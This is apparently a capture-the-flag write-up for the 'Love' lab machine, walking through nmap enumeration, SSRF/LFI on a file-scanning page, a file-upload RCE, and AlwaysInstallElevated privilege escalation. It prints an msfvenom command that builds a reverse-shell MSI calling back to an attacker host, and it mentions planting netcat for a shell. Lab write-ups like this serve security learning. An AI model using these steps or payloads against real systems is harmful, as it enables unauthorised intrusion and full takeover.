# Enumeration

As always, starting with nmap
```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-28 16:52 IST
Nmap scan report for 10.10.10.239
Host is up (0.34s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Voting System using PHP
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql?
5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h53m00s, deviation: 4h02m31s, median: 32m59s
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-05-28T04:55:50-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-28T11:55:51
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.62 seconds
```
Looking at the results, we have quite a few ports to enumerate:
- HTTP/HTTPS on 80,443 and 5000
- SMB on 135/445
- MySQL on 3306

Also from the results, we can find the domain and subdomains from HTTPS certificate. In our case, we have `staging.love.htb`, add this to hosts file.

### Love.htb
Navigating to webpage,

![image](https://user-images.githubusercontent.com/94787830/145250939-ff62f037-0568-41c5-b245-845ef76ca512.png)

Trying some common set of credentials didn't work. Also basic SQL injections didn’t lead anywhere either.

### Staging.love.htb
It was running a file scanning application.

![image](https://user-images.githubusercontent.com/94787830/145251478-188b6396-b848-44cb-b7c1-d461ac37ba0e.png)

In the nav bar at the top, Demo goes to `/beta.php`, where there’s a form that takes a url:
![image](https://user-images.githubusercontent.com/43528306/120352563-8142b580-c31e-11eb-99d5-5f43aab3865a.png)

Here, we can specify files we need to scan. Tried checking for RFI, it does connect back to us but not able to execute the file. 
Looking around, Googling the error messages, we were able to find the directory structure of the xampp files on target system.

We can exploit the LFI vulnerability, and download the source of the webpage.
Looking at `C:\xampp\apache\conf\extra\httpd-vhosts.conf`, found the vhosts configuration which tell the exact directory of files located. 
Looking at some interesting files:

- ***Conn.php***
```php
<?php
	$conn = new mysqli('localhost', 'phoebe', 'HTB#9826^(_', 'votesystem');

	if ($conn->connect_error) {
	    die("Connection failed: " . $conn->connect_error);
	}
	
?>
```

- ***Sessions.php***
```php
?php
	include 'includes/conn.php';
	session_start();

	if(isset($_SESSION['voter'])){
		$sql = "SELECT * FROM voters WHERE id = '".$_SESSION['voter']."'";
		$query = $conn->query($sql);
		$voter = $query->fetch_assoc();
	}
	else{
		header('location: index.php');
		exit();
	}

?>
```
From above, we found the username. Trying to get the user flag using paylaod `file://C:\users\phoebe\desktop\user.txt` and we got the file. This whole part seems more like a rabbit hole.

#### SSRF
We were able to make request to our IP from the server. We could try checking if we can access other ports using this functionality
![image](https://user-images.githubusercontent.com/43528306/120333224-19d03a00-c30d-11eb-83de-786e503b8916.png)

We got credentials for Voting System using which we have admin rights on the application. After poking a bit with application, found it was vulnerable to **File Upload** Vulnerability in *Add voters* Functionality.
We can now upload a malicious PHP file and get RCE on the box. 

In order to get reverse shell, we need to first upload `nc`(netcat) on the box.

## ROOT

Running [Winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS), which is windows enumeration script. The output shows it was vulnerable to `Alwaysinstallelevated`.

```batch
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

With help of this [article](https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/). We can create a malicious .msi file which will give us reverse shell as system

```bash
msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp LHOST=10.0.2.4 LPORT=1337 --encoder x64/xor --iterations 9 --format msi --out out.msi
```
Now we can upload our malicious .msi file, and running it gave back us shell as administrator.

